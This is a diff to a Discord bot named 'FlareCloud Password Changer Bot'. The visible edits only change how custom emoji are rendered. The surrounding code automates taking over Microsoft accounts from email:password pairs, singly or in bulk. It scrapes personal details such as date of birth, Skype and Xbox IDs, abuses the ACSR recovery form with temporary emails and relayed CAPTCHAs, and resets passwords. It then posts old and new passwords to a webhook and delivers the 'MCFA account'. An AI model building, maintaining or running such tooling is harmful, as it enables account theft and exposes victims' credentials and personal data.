@@ -228,6 +228,28 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 data_manager = BotDataManager()
 
 
+# ==================== EMOJI RESOLVER (by name) ====================
+def e(name: str, fallback: str = "") -> str:
+    """Resolve custom emoji by name from any guild the bot shares.
+    If not found, returns fallback (original markup) so nothing breaks.
+    Add the emoji to your server with the same name to make it show.
+    """
+    try:
+        emoji = discord.utils.get(bot.emojis, name=name)
+        if emoji is None:
+            lower = name.lower()
+            for em in bot.emojis:
+                if em.name.lower() == lower:
+                    emoji = em
+                    break
+        if emoji is not None:
+            return str(emoji)
+    except Exception:
+        pass
+    return fallback or ""
+
+
+
 # HELPER FUNCTIONS
 def create_embed(title, description, color, fields=None):
     embed = discord.Embed(title=title,
@@ -255,23 +277,23 @@ async def send_to_webhook(result):
     webhook_data = {
         "embeds": [{
             "title":
-            "<:password_recovery40:1467913845262778421> Password Changed Successfully",
+            f"{e('password_recovery40', '<:password_recovery40:1467913845262778421>')} Password Changed Successfully",
             "color":
             COLOR_SUCCESS,
             "fields": [{
-                "name": "<:Icon_Mail:1469702058868211815> Email",
+                "name": f"{e('Icon_Mail', '<:Icon_Mail:1469702058868211815>')} Email",
                 "value": f"`{result['email']}`",
                 "inline": False
             }, {
-                "name": "<:password:1469702059904467057> Old Password",
+                "name": f"{e('password', '<:password:1469702059904467057>')} Old Password",
                 "value": f"`{result['old_password']}`",
                 "inline": True
             }, {
-                "name": "<:password:1469702059904467057> New Password",
+                "name": f"{e('password', '<:password:1469702059904467057>')} New Password",
                 "value": f"`{result['newpass']}`",
                 "inline": True
             }, {
-                "name": "<:name:1469702060705583359> Name",
+                "name": f"{e('name', '<:name:1469702060705583359>')} Name",
                 "value": result.get('name', 'N/A'),
                 "inline": True
             }, {
@@ -279,19 +301,19 @@ async def send_to_webhook(result):
                 "value": result.get('dob', 'N/A'),
                 "inline": True
             }, {
-                "name": "<:world:1469702063226224683> Region",
+                "name": f"{e('world', '<:world:1469702063226224683>')} Region",
                 "value": result.get('region', 'N/A'),
                 "inline": True
             }, {
-                "name": "<:skype:1469702061376405544> Skype ID",
+                "name": f"{e('skype', '<:skype:1469702061376405544>')} Skype ID",
                 "value": result.get('skype_id', 'N/A'),
                 "inline": True
             }, {
-                "name": "<:skype:1469702061376405544> Skype Email",
+                "name": f"{e('skype', '<:skype:1469702061376405544>')} Skype Email",
                 "value": result.get('skype_email', 'N/A'),
                 "inline": True
             }, {
-                "name": "<a:xbox:1469702061875527866> Xbox Gamertag",
+                "name": f"{e('xbox', '<a:xbox:1469702061875527866>')} Xbox Gamertag",
                 "value": result.get('gamertag', 'N/A'),
                 "inline": True
             }],
@@ -323,7 +345,7 @@ async def process_account_full(email, password, user_id, channel, newpass):
         # Step 1: Scrape account info
         if channel:
             await channel.send(embed=create_embed(
-                "<:Accounts:1469720768668766208> Step 1/5: Scraping Account Info",
+                f"{e('Accounts', '<:Accounts:1469720768668766208>')} Step 1/5: Scraping Account Info",
                 f"Logging into `{email}` to gather account details...",
                 COLOR_INFO))
 
@@ -354,7 +376,7 @@ async def process_account_full(email, password, user_id, channel, newpass):
         # Step 2: Submit ACSR form
         if channel:
             await channel.send(embed=create_embed(
-                "<:Microsoft:1466088532178243751> Step 2/5: Submitting ACSR Form",
+                f"{e('Microsoft', '<:Microsoft:1466088532178243751>')} Step 2/5: Submitting ACSR Form",
                 f"✅ Scraped: **{account_info.get('name', 'Unknown')}**\n\nGenerating temp email and submitting recovery form...",
                 COLOR_INFO))
 
@@ -401,7 +423,7 @@ async def process_account_full(email, password, user_id, channel, newpass):
 
         if target_channel:
             await target_channel.send(embed=create_embed(
-                "<:captcha:1469721591196680275> CAPTCHA Required | Attempt: 1",
+                f"{e('captcha', '<:captcha:1469721591196680275>')} CAPTCHA Required | Attempt: 1",
                 "Please solve the CAPTCHA shown above:\n\n**Instructions**\n• Look at the image below\n• Type the characters you see\n• You have 5 minutes to respond",
                 COLOR_WARNING),
                                       file=discord.File(captcha_filename))
@@ -444,7 +466,7 @@ async def continue_after_captcha(user_id, captcha_text, interaction):
 
         # Step 4: Continue ACSR
         await channel.send(embed=create_embed(
-            "<:Microsoft:1466088532178243751> Step 4/5: Continuing ACSR Flow",
+            f"{e('Microsoft', '<:Microsoft:1466088532178243751>')} Step 4/5: Continuing ACSR Flow",
             "Submitting CAPTCHA and waiting for OTP from temp email...",
             COLOR_INFO))
 
@@ -517,7 +539,7 @@ async def continue_after_captcha(user_id, captcha_text, interaction):
 
         # Step 5: Reset password
         await channel.send(embed=create_embed(
-            "<:password:1469702059904467057> Step 5/5: Resetting Password",
+            f"{e('password', '<:password:1469702059904467057>')} Step 5/5: Resetting Password",
             f"Opening reset link and changing password to **{desired_password}**...",
             COLOR_INFO))
 
@@ -566,17 +588,17 @@ async def continue_after_captcha(user_id, captcha_text, interaction):
         data_manager.update_stats(user_id, True)
 
         await channel.send(embed=create_embed(
-                "<a:mcfa:1469721885259469053> Here is your MCFA account!",
+                f"{e('mcfa', '<a:mcfa:1469721885259469053>')} Here is your MCFA account!",
                 f"**Account Details Below**",
                 COLOR_SUCCESS,
                 [
                     {
-                        "name": "<:Icon_Mail:1469702058868211815> Email",
+                        "name": f"{e('Icon_Mail', '<:Icon_Mail:1469702058868211815>')} Email",
                         "value": f"`{email}`",
                         "inline": False
                     },
                     {
-                        "name": "<:password:1469702059904467057> Password",
+                        "name": f"{e('password', '<:password:1469702059904467057>')} Password",
                         "value": f"`{actual_password}`",
                         "inline": False
                     },
@@ -732,7 +754,7 @@ async def continue_after_captcha_message(user_id, captcha_text, channel, user):
 
             if channel:
                 await channel.send(embed=create_embed(
-                    f"<:captcha:1469721591196680275> CAPTCHA Required | Attempt: {session['captcha_attempts'] + 1}",
+                    f"{e('captcha', '<:captcha:1469721591196680275>')} CAPTCHA Required | Attempt: {session['captcha_attempts'] + 1}",
                     "Please solve the CAPTCHA shown above:\n\n**Instructions**\n• Look at the image below\n• Type the characters you see\n• You have 5 minutes to respond",
                     COLOR_WARNING),
                                    file=discord.File(new_captcha_filename))
@@ -743,7 +765,7 @@ async def continue_after_captcha_message(user_id, captcha_text, channel, user):
             if "timeout" in str(reset_link).lower():
                 if channel:
                     embed = discord.Embed(
-                        title="<:captcha:1469721591196680275> Captcha Timeout",
+                        title=f"{e('captcha', '<:captcha:1469721591196680275>')} Captcha Timeout",
                         description="CAPTCHA timeout. Trying next account.",
                         color=COLOR_ERROR)
                     await channel.send(embed=embed)
@@ -787,7 +809,7 @@ async def continue_after_captcha_message(user_id, captcha_text, channel, user):
                     print(f"❌ Reward API error ({final_url}): {e}")
 
             embed = discord.Embed(
-                title="<:captcha:1469721591196680275> Correct CAPTCHA Solved",
+                title=f"{e('captcha', '<:captcha:1469721591196680275>')} Correct CAPTCHA Solved",
                 description=
                 f"{user.mention} has successfully solved the CAPTCHA!",
                 color=COLOR_SUCCESS)
@@ -799,7 +821,7 @@ async def continue_after_captcha_message(user_id, captcha_text, channel, user):
         # Step 5: Reset password
         if original_channel:
             await original_channel.send(embed=create_embed(
-                "<:password:1469702059904467057> Step 5/5: Resetting Password",
+                f"{e('password', '<:password:1469702059904467057>')} Step 5/5: Resetting Password",
                 f"Opening reset link and changing password to **{desired_password}**...",
                 COLOR_INFO))
 
@@ -839,13 +861,13 @@ async def continue_after_captcha_message(user_id, captcha_text, channel, user):
 
         if original_channel:
             await original_channel.send(embed=create_embed(
-                "<:password:1469702059904467057> SUCCESS! Password Changed!", f"**Account:** `{email}`",
+                f"{e('password', '<:password:1469702059904467057>')} SUCCESS! Password Changed!", f"**Account:** `{email}`",
                 COLOR_SUCCESS, [{
-                    "name": "<:password:1469702059904467057> Old Password",
+                    "name": f"{e('password', '<:password:1469702059904467057>')} Old Password",
                     "value": f"`{password}`",
                     "inline": True
                 }, {
-                    "name": "<:password:1469702059904467057> New Password",
+                    "name": f"{e('password', '<:password:1469702059904467057>')} New Password",
                     "value": f"`{actual_password}`",
                     "inline": True
                 }]))
@@ -947,7 +969,7 @@ def check_login():
     async def predicate(interaction: discord.Interaction) -> bool:
         if not data_manager.is_authenticated(interaction.user.id):
             await interaction.response.send_message(embed=create_embed(
-                "<a:Wrong:1466073421275201661> Not Logged In",
+                f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Not Logged In",
                 "Use `/request_otp` and `/verify_otp` first.", COLOR_ERROR),
                                                     ephemeral=True)
             return False
@@ -964,24 +986,24 @@ def check_login():
 async def help_command(interaction: discord.Interaction):
     if not data_manager.is_authorized(interaction.user.id, interaction.user):
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Not Authorized", f"Contact admin (ID: `{ADMIN_IDS}`).",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Not Authorized", f"Contact admin (ID: `{ADMIN_IDS}`).",
             COLOR_ERROR),
                                                 ephemeral=True)
         return
 
     embed = discord.Embed(
-        title="<:emoji_1:1480400701556396202> FlareCloud Password Changer Bot",
+        title=f"{e('emoji_1', '<:emoji_1:1480400701556396202>')} FlareCloud Password Changer Bot",
         description="**Full ACSR Automation** - FlareCloud Edition",
         color=COLOR_PRIMARY)
 
-    embed.add_field(name="<:password:1469702059904467057> Authentication",
+    embed.add_field(name=f"{e('password', '<:password:1469702059904467057>')} Authentication",
                     value=("`/request_otp` - Get 6-digit code in DM\n"
                            "`/verify_otp <code>` - Login with OTP\n"
                            "`/logout` - End your session"),
                     inline=False)
 
     embed.add_field(
-        name="<a:service:1454372369639669878> Processing",
+        name=f"{e('service', '<a:service:1454372369639669878>')} Processing",
         value=("`/process <email:pass> <newpass>` - Start processing\n"
                "`/submit_captcha <text>` - Solve CAPTCHA\n"
                "`/status` - Check your session\n"
@@ -989,7 +1011,7 @@ async def help_command(interaction: discord.Interaction):
         inline=False)
 
     if interaction.user.id == ADMIN_IDS:
-        embed.add_field(name="<:Admin:1469724795137425551> Admin Commands",
+        embed.add_field(name=f"{e('Admin', '<:Admin:1469724795137425551>')} Admin Commands",
                         value=("`/panel` - Admin Control panel\n"
                                "`/auth @user <duration>` - Grant access\n"
                                "`/unauth @user` - Remove access\n"
@@ -998,13 +1020,13 @@ async def help_command(interaction: discord.Interaction):
                                "`/stats` - View statistics"),
                         inline=False)
 
-    embed.add_field(name="<a:tick:1454372387511472313> Quick Start",
+    embed.add_field(name=f"{e('tick', '<a:tick:1454372387511472313>')} Quick Start",
                     value=("1️⃣ `/request_otp` → Get code in DM\n"
                            "2️⃣ `/verify_otp <code>` → Authenticate\n"
                            "3️⃣ `/process email:pass newPass123` → Start\n"
                            "4️⃣ Bot shows CAPTCHA → Solve it\n"
                            "5️⃣ `/submit_captcha <text>` → Continue\n"
-                           "6️⃣ <a:tick:1454372387511472313> Password changed automatically!"),
+                           f"6️⃣ {e('tick', '<a:tick:1454372387511472313>')} Password changed automatically!"),
                     inline=False)
 
     embed.set_footer(text="FlareCloud • Full Automation System")
@@ -1019,7 +1041,7 @@ async def request_otp(interaction: discord.Interaction):
 
     if data_manager.is_authenticated(user_id):
         await interaction.response.send_message(embed=create_embed(
-            "ℹ<:info:1469728865554534671> Already Logged In", "You are already authenticated.",
+            f"ℹ{e('info', '<:info:1469728865554534671>')} Already Logged In", "You are already authenticated.",
             COLOR_INFO),
                                                 ephemeral=True)
         return
@@ -1028,18 +1050,18 @@ async def request_otp(interaction: discord.Interaction):
 
     try:
         dm_embed = create_embed(
-            "<:password:1469702059904467057> Your One-Time Password (OTP)",
+            f"{e('password', '<:password:1469702059904467057>')} Your One-Time Password (OTP)",
             f"Your OTP is: **`{otp}`**\n\nThis code expires in **5 minutes**.\nUse `/verify_otp {otp}` in the server.",
             COLOR_WARNING)
         await interaction.user.send(embed=dm_embed)
 
         await interaction.response.send_message(embed=create_embed(
-            "<a:tick:1454372387511472313> OTP Sent", "Check your direct messages for the code.",
+            f"{e('tick', '<a:tick:1454372387511472313>')} OTP Sent", "Check your direct messages for the code.",
             COLOR_SUCCESS),
                                                 ephemeral=True)
     except discord.Forbidden:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> DM Failed", "Enable DMs from server members.", COLOR_ERROR),
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} DM Failed", "Enable DMs from server members.", COLOR_ERROR),
                                                 ephemeral=True)
 
 
@@ -1053,12 +1075,12 @@ async def verify_otp(interaction: discord.Interaction, code: str):
 
     if success:
         await interaction.response.send_message(embed=create_embed(
-            "<a:tick:1454372387511472313> Authentication Success",
+            f"{e('tick', '<a:tick:1454372387511472313>')} Authentication Success",
             f"{message}\n\nYou can now use `/process` to change passwords!",
             COLOR_SUCCESS))
     else:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Authentication Failed", message, COLOR_ERROR),
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Authentication Failed", message, COLOR_ERROR),
                                                 ephemeral=True)
 
 
@@ -1091,7 +1113,7 @@ async def process_account(interaction: discord.Interaction,
     # 1. Validation: Check password length (only if user provided one)
     if newpass and len(newpass) <= 8:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Password Too Short",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Password Too Short",
             "Custom password must be **more than 8 characters** long.",
             COLOR_ERROR),
                                                 ephemeral=True)
@@ -1100,7 +1122,7 @@ async def process_account(interaction: discord.Interaction,
     # 2. Validation: Check account format
     if ":" not in emailpass:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Invalid Format", "Use: `email:password`", COLOR_ERROR),
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Invalid Format", "Use: `email:password`", COLOR_ERROR),
                                                 ephemeral=True)
         return
 
@@ -1110,7 +1132,7 @@ async def process_account(interaction: discord.Interaction,
 
     if user_id in data_manager.processing_sessions:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Session Active",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Session Active",
             "Complete or cancel your current process first. Use `/cancel`.",
             COLOR_WARNING),
                                                 ephemeral=True)
@@ -1136,25 +1158,25 @@ async def check_status(interaction: discord.Interaction):
     user_id = interaction.user.id
 
     fields = [{
-        "name": "<:password:1469702059904467057> Authentication",
-        "value": "<a:tick:1454372387511472313> Logged In",
+        "name": f"{e('password', '<:password:1469702059904467057>')} Authentication",
+        f"value": f"{e('tick', '<a:tick:1454372387511472313>')} Logged In",
         "inline": True
     }]
 
     if user_id in data_manager.processing_sessions:
         session = data_manager.processing_sessions[user_id]
         fields.append({
-            "name": "<:captcha:1469721591196680275> Active Process",
+            "name": f"{e('captcha', '<:captcha:1469721591196680275>')} Active Process",
             "value": "CAPTCHA Pending",
             "inline": True
         })
         fields.append({
-            "name": "<:Icon_Mail:1469702058868211815> Target Email",
+            "name": f"{e('Icon_Mail', '<:Icon_Mail:1469702058868211815>')} Target Email",
             "value": f"`{session['email']}`",
             "inline": False
         })
         fields.append({
-            "name": "<:captcha:1469721591196680275> CAPTCHA Attempts",
+            "name": f"{e('captcha', '<:captcha:1469721591196680275>')} CAPTCHA Attempts",
             "value": f"{session['captcha_attempts']} / 3",
             "inline": True
         })
@@ -1162,21 +1184,21 @@ async def check_status(interaction: discord.Interaction):
         channel_id = session.get('channel_id')
         channel_mention = f"<#{channel_id}>" if channel_id else "Unknown"
         fields.append({
-            "name": "<:location:1469727484755841156> Submit Location",
+            "name": f"{e('location', '<:location:1469727484755841156>')} Submit Location",
             "value": channel_mention,
             "inline": True
         })
 
-        embed = create_embed("<:captcha:1469721591196680275> Active Session",
+        embed = create_embed(f"{e('captcha', '<:captcha:1469721591196680275>')} Active Session",
                              "You have a pending CAPTCHA.", COLOR_WARNING,
                              fields)
     else:
         fields.append({
-            "name": "<:captcha:1469721591196680275> Active Process",
-            "value": "<a:Wrong:1466073421275201661> None",
+            "name": f"{e('captcha', '<:captcha:1469721591196680275>')} Active Process",
+            f"value": f"{e('Wrong', '<a:Wrong:1466073421275201661>')} None",
             "inline": True
         })
-        embed = create_embed("<a:tick:1454372387511472313> Status OK", "Ready to process accounts.",
+        embed = create_embed(f"{e('tick', '<a:tick:1454372387511472313>')} Status OK", "Ready to process accounts.",
                              COLOR_SUCCESS, fields)
 
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1190,7 +1212,7 @@ async def cancel_process(interaction: discord.Interaction):
 
     if user_id not in data_manager.processing_sessions:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> No Active Process",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} No Active Process",
             "You don't have an active process to stop.", COLOR_INFO),
                                                 ephemeral=True)
         return
@@ -1211,7 +1233,7 @@ async def cancel_process(interaction: discord.Interaction):
     del data_manager.processing_sessions[user_id]
 
     await interaction.response.send_message(
-        embed=create_embed("<a:tick:1454372387511472313> Process Stopped",
+        embed=create_embed(f"{e('tick', '<a:tick:1454372387511472313>')} Process Stopped",
                            "Your session has been terminated.", COLOR_SUCCESS))
 
 
@@ -1224,7 +1246,7 @@ async def set_captcha_channel(interaction: discord.Interaction,
     data_manager.config["captcha_channel_id"] = str(channel.id)
     data_manager.save_config()
     await interaction.response.send_message(embed=create_embed(
-        "<a:tick:1454372387511472313> CAPTCHA Channel Set",
+        f"{e('tick', '<a:tick:1454372387511472313>')} CAPTCHA Channel Set",
         f"CAPTCHAs will now be sent to {channel.mention}. The next message in that channel will be treated as the answer.",
         COLOR_SUCCESS),
                                             ephemeral=True)
@@ -1262,14 +1284,14 @@ async def process_bulk(interaction: discord.Interaction,
     # Check if user already has an active session
     if user_id in data_manager.processing_sessions:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Session Active",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Session Active",
             "Complete or cancel your current process first. Use `/cancel`.",
             COLOR_WARNING),
                                                 ephemeral=True)
         return
 
     await interaction.response.send_message(embed=create_embed(
-        "<a:file:1469725213733163264> Bulk Process Started",
+        f"{e('file', '<a:file:1469725213733163264>')} Bulk Process Started",
         f"Processing **{len(accounts)}** accounts. Passwords will be auto-generated.",
         COLOR_INFO))
 
@@ -1303,21 +1325,21 @@ async def process_bulk(interaction: discord.Interaction,
 async def admin_panel(interaction: discord.Interaction):
     if interaction.user.id != ADMIN_IDS:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Access Denied", "You are not allowed to use this command.",
             COLOR_ERROR),
                                                 ephemeral=True)
         return
 
     stats = data_manager.stats
     embed = create_embed(
-        "<:Admin:1469724795137425551> Admin Control Panel", "FlareCloud Password Changer Bot Management",
+        f"{e('Admin', '<:Admin:1469724795137425551>')} Admin Control Panel", "FlareCloud Password Changer Bot Management",
         COLOR_PRIMARY, [{
-            "name": "<a:stats:1466490600575729799> Stats",
+            "name": f"{e('stats', '<a:stats:1466490600575729799>')} Stats",
             "value":
             f"**Users:** {len(data_manager.authorized_users)}\n**Active Sessions:** {len(data_manager.active_sessions)}\n**Processing:** {len(data_manager.processing_sessions)}",
             "inline": True
         }, {
-            "name": "<a:stats:1466490600575729799> Totals",
+            "name": f"{e('stats', '<a:stats:1466490600575729799>')} Totals",
             "value":
             f"**Total Processed:** {stats['total_processed']}\n**Success:** {stats['total_success']}\n**Failed:** {stats['total_failed']}",
             "inline": True
@@ -1334,7 +1356,7 @@ async def authorize_user(interaction: discord.Interaction,
                          duration: Optional[int] = None):
     if interaction.user.id != ADMIN_IDS:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Access Denied", "You are not allowed to use this command.",
             COLOR_ERROR),
                                                 ephemeral=True)
         return
@@ -1350,7 +1372,7 @@ async def authorize_user(interaction: discord.Interaction,
         msg = f"Granted **Permanent** access to {user.mention}"
 
     await interaction.response.send_message(
-        embed=create_embed("<a:tick:1465706185834627153> User Authorized", msg, COLOR_SUCCESS))
+        embed=create_embed(f"{e('tick', '<a:tick:1465706185834627153>')} User Authorized", msg, COLOR_SUCCESS))
 
 
 @bot.tree.command(name="unauth",
@@ -1359,21 +1381,21 @@ async def authorize_user(interaction: discord.Interaction,
 async def revoke_user(interaction: discord.Interaction, user: discord.Member):
     if interaction.user.id != ADMIN_IDS:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Access Denied", "You are not allowed to use this command.",
             COLOR_ERROR),
                                                 ephemeral=True)
         return
 
     data_manager.revoke_user(user.id)
     await interaction.response.send_message(embed=create_embed(
-        "<a:Wrong:1466073421275201661> User Revoked", f"Removed access for {user.mention}", COLOR_WARNING))
+        f"{e('Wrong', '<a:Wrong:1466073421275201661>')} User Revoked", f"Removed access for {user.mention}", COLOR_WARNING))
 
 
 @bot.tree.command(name="list_authed", description="List all authorized users")
 async def list_users(interaction: discord.Interaction):
     if interaction.user.id != ADMIN_IDS:
         await interaction.response.send_message(embed=create_embed(
-            "<a:Wrong:1466073421275201661> Access Denied", "You are not allowed to use this command.",
+            f"{e('Wrong', '<a:Wrong:1466073421275201661>')} Access Denied", "You are not allowed to use this command.",
             COLOR_ERROR),
                                                 ephemeral=True)
         return
